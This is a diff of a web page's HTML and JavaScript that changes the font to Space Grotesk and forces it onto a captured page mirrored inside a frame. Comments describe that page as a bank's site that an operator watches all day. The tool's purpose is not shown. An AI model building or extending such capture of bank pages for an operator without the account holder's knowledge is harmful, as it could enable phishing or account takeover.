@@ -56,23 +56,25 @@
     <title id="pageTitle">Loading...</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <!-- Montserrat is cosmetic and it is the only third-party resource this
-         page needs. As a plain <link rel="stylesheet"> it is RENDER-BLOCKING:
-         the browser refuses to paint until fonts.googleapis.com answers, so
-         on a slow or filtered mobile network the visitor stared at nothing
-         (or at a bare spinner) for as long as that request took. It is now
-         fetched after the first paint; the system font stack below covers
-         the gap, and with no network the page still paints immediately. -->
+    <!-- Space Grotesk is the only third-party resource this page needs, and it
+         is the same font the panels use. As a plain <link rel="stylesheet"> it
+         is RENDER-BLOCKING: the browser refuses to paint until
+         fonts.googleapis.com answers, so on a slow or filtered mobile network
+         the visitor stared at nothing (or at a bare spinner) for as long as
+         that request took. It is fetched after the first paint; the system
+         font stack below covers the gap, and with no network the page still
+         paints immediately. Fetching it here also warms the cache for the
+         mirrored page inside the frame, which asks for the same file. -->
     <link rel="preload" as="style"
-          href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400&display=swap"
+          href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap"
           onload="this.onload=null;this.rel='stylesheet'">
     <noscript>
-      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400&display=swap">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap">
     </noscript>
     <style>
-        /* ===== Global font: Montserrat (falls back gracefully if CDN blocked) ===== */
+        /* ===== Global font: Space Grotesk (falls back gracefully if CDN blocked) ===== */
         html, body, input, button, textarea, select, optgroup {
-            font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         /* ===== Perfect browser rendering: Full viewport fill, no black bars ===== */
@@ -5409,6 +5411,77 @@ function applySpinnerColorFromHex(hexColor) {
                 try { ensureMirrorScrolling(doc, win); } catch (e) { /* ignore */ }
             }
 
+            // -----------------------------------------------------------------
+            // One font across a captured page
+            // -----------------------------------------------------------------
+            // The shell and the panels are set in Space Grotesk; a mirror that
+            // renders in the bank's own Arial looks like a different product,
+            // and it is the page the operator sits in front of all day. So the
+            // captured document is set in Space Grotesk too — every element of
+            // it, including inputs, buttons and tables.
+            //
+            // Two things are deliberately left alone:
+            //
+            //   * icon fonts (Font Awesome, Material Icons, Glyphicons, MDI).
+            //     Their glyphs are characters in *their* font, so replacing the
+            //     family would turn every icon into a letter;
+            //   * svg, which draws its own text.
+            //
+            // `?keep_fonts=1` on the client URL leaves a page with its own
+            // typography (for checking a capture against the real site).
+            const MIRROR_FONT_STACK = "'Space Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
+            const MIRROR_FONT_HREF = 'https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap';
+            // NB: only simple `:not()` arguments. A complex one (`:not(svg *)`)
+            // is silently ignored by some engines, which would then match the
+            // icons this list exists to protect.
+            const MIRROR_FONT_SKIP = ':not(svg):not(i):not([class*="icon"])'
+                + ':not([class*="fa-"]):not([class*="fa "]):not([class*="glyphicon"])'
+                + ':not([class*="material-icons"]):not([class*="mdi"])';
+
+            let mirrorFontForced = null;
+            function mirrorFontEnabled() {
+                if (mirrorFontForced !== null) return mirrorFontForced;
+                mirrorFontForced = true;
+                try {
+                    const q = new URLSearchParams(window.location.search);
+                    const off = String(q.get('keep_fonts') || q.get('keep_font') || '').toLowerCase();
+                    if (off === '1' || off === 'true' || off === 'yes') mirrorFontForced = false;
+                } catch (e) { /* keep the default */ }
+                return mirrorFontForced;
+            }
+
+            function ensureMirrorFont(doc) {
+                if (!doc || !doc.head || !mirrorFontEnabled()) return false;
+                try {
+                    if (!doc.getElementById('__shifix_mirror_font_css__')) {
+                        const link = doc.createElement('link');
+                        link.id = '__shifix_mirror_font_css__';
+                        link.rel = 'stylesheet';
+                        link.href = MIRROR_FONT_HREF;
+                        link.setAttribute('data-stream-injected', 'true');
+                        doc.head.appendChild(link);
+                    }
+                    let leaf = doc.getElementById('__shifix_mirror_font__');
+                    if (!leaf) {
+                        leaf = doc.createElement('style');
+                        leaf.id = '__shifix_mirror_font__';
+                        leaf.setAttribute('data-stream-injected', 'true');
+                        leaf.textContent =
+                            'html,body{font-family:' + MIRROR_FONT_STACK + '!important;}' +
+                            'body,body *' + MIRROR_FONT_SKIP +
+                            '{font-family:' + MIRROR_FONT_STACK + '!important;}';
+                        doc.head.appendChild(leaf);
+                    } else if (leaf.nextElementSibling) {
+                        // Keep it last: a page rule injected after ours would
+                        // otherwise win back its own font on a tie.
+                        doc.head.appendChild(leaf);
+                    }
+                    return true;
+                } catch (e) {
+                    return false;
+                }
+            }
+
             function initializeViewportState() {
                 // DOM-capture mode: keep logical viewport + server viewport
                 // state.  (Canvas-era code also sized and super-sampled a
@@ -6729,7 +6802,7 @@ function applySpinnerColorFromHex(hexColor) {
                     style.textContent = `
                         #lpv-root {
                             position: fixed; inset: 0; z-index: 2147483646;
-                            pointer-events: none; font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+                            pointer-events: none; font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                             user-select: none;
                             overflow: hidden;
                         }
@@ -6809,7 +6882,7 @@ function applySpinnerColorFromHex(hexColor) {
                             padding: 11px 16px; border-radius: 12px;
                             background: rgba(17, 19, 26, 0.94);
                             color: #f3f5ff; font-size: 13px; line-height: 1.4;
-                            font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+                            font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                             box-shadow: 0 14px 40px -12px rgba(0,0,0,0.75);
                             border: 1px solid rgba(255,255,255,0.12);
                             opacity: 0; pointer-events: none;
@@ -7713,6 +7786,7 @@ function applySpinnerColorFromHex(hexColor) {
                                 // own scripts (now stripped) would sit there
                                 // unable to move: hand the scroll back.
                                 try {
+                                    ensureMirrorFont(innerDoc);
                                     ensureMirrorScrolling(innerDoc, frame.contentWindow);
                                     const _pd = innerDoc, _pw = frame.contentWindow;
                                     setTimeout(function () {
@@ -11172,6 +11246,9 @@ function applySpinnerColorFromHex(hexColor) {
                 // page's own scroll code did not survive the capture, so this is
                 // what keeps it scrollable.
                 try { ensureMirrorScrolling(d, d.defaultView); } catch (e) {}
+                // Space Grotesk across the captured page, the same font as the
+                // shell and the panels.
+                try { ensureMirrorFont(d); } catch (e) {}
 
                 // Desktop wheel listener on iframe document without preventing default:
                 try {
